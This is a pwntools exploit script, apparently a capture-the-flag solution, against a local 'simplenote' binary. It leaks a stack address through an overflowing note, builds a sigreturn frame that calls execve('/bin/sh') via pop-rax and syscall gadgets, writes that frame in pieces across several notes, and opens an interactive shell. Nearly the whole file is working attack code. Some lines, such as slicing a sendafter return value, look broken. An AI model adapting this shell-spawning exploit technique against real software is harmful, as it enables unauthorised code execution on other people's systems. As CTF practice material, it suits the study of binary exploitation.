#!/bin/python
from pwn import *
exe = ELF('./simplenote')
p = process(exe.path)
context.terminal = ['foot']
gdb.attach(p, gdbscript='''

           # b*0x040113f      
           # b*0x040117d      
           # b*0x40123a
           # b*main+287
        
           
           ''')
#################exploiting#####################
context.clear(arch='amd64')

# pop_rax = 0x0000000000401239
# p.sendafter(b'>',b'1')
# p.sendafter(b'Data:', b'a')
# pop_rax = 0x0000000000401239
# p.sendafter(b'>',b'1')
# p.sendafter(b'Data:', b'a')
# pop_rax = 0x0000000000401239
# p.sendafter(b'>',b'1')
# p.sendafter(b'Data:', b'a')
# p.sendafter(b'>',b'1')
# p.sendafter(b'Data:', p64(0)*2+ b'/bin/sh\0')
# p.sendafter(b'>',b'4')
# p.sendafter(b'>',b'4')
# p.sendafter(b'>',b'4')
# p.sendafter(b'>',b'4')
pop_rax = 0x0000000000401239
p.sendafter(b'>',b'1')
p.sendafter(b'Data:', b'a'*0x40)            #1
p.sendafter(b'>', b'2')
p.recvuntil(b'a'*0x40)
leak_addr = u64(p.recv(1) + p.recv(1)+p.recv(1) + p.recv(1) +p.recv(1)+p.recv(1) + b'\x00\x00')
log.info(f'leak_addr: {hex(leak_addr)}')
syscall = 0x0000000000401014
####################################################################

bin_sh = leak_addr +0x1c0
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rsp = syscall
frame.rdi = bin_sh
frame.rsi = 0
frame.rip = syscall 
frame.rdx = 0


##########################################

p.sendafter(b'>',b'4')
p.sendafter(b'>',b'4')
p.sendafter(b'>',b'4')
###############################################
p.sendafter(b'>', b'1')
p.sendafter(b'Data:', b'f' *0x40)                  #2



p.sendafter(b'>',b'4')
p.sendafter(b'>',b'4')
p.sendafter(b'>',b'4')
p.sendafter(b'>',b'4')
p.sendafter(b'>',b'4')
p.sendafter(b'>',b'4')



p.sendafter(b'>',b'1')
p.sendafter(b'Data:',b'/bin/sh\0')  
p.sendafter(b'>',b'1')
p.sendafter(b'Data:',b'd'*0x40)               #3
p.sendafter(b'>',b'1')
p.sendafter(b'Data:', flat(frame)[88+64+64:])               #3
p.sendafter(b'>',b'1')
p.sendafter(b'Data:', flat(frame)[88+64:-32])
p.sendafter(b'>',b'1')
p.sendafter(b'Data:',flat(frame)[88:-96] )
p.sendafter(b'>',b'1')
p.sendafter(b'Data:',flat(frame)[24:-160])






payload = b'a' * 0x18
payload += p64(pop_rax) + p64(0xf)
payload += flat(frame)
p.sendafter(b'>',b'1')[:-224]
p.sendafter(b'Data:',payload)                #6

# p.sendlineafter(b'Data:', payload)
# p.sendafter(b'Data:', b'a')

##############the end###########################
p.interactive()
